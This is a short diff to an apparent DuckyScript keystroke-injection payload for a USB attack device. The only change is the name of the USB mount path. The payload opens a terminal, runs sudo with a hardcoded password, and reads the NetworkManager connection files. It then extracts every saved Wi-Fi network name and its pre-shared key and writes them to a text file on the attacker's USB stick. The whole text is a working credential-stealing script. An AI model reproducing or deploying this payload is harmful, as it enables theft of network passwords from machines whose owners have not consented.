@@ -1,6 +1,6 @@
 CTRL ALT t
 DELAY 1000
-STRING echo -e "Wireless_Network_Name Password\n--------------------- --------" > /media/$(hostname)/UsbStick/wifi_pass.txt
+STRING echo -e "Wireless_Network_Name Password\n--------------------- --------" > /media/$(hostname)/USBSTICK/wifi_pass.txt
 ENTER
 STRING for FILE in /etc/NetworkManager/system-connections/*;
 ENTER
@@ -8,7 +8,7 @@ STRING echo PASSWORD | sudo -S echo
 ENTER
 STRING do echo -e "$(sudo <<< PASSWORD cat "$FILE" | grep -oP '(?<=ssid=).*') \t\t\t\t  $(sudo <<< PASSWORD cat "$FILE" | grep -oP '(?<=psk=).*')"
 ENTER
-STRING done >> /media/$(hostname)/UsbStick/wifi_pass.txt
+STRING done >> /media/$(hostname)/USBSTICK/wifi_pass.txt
 ENTER
 STRING exit
 ENTER
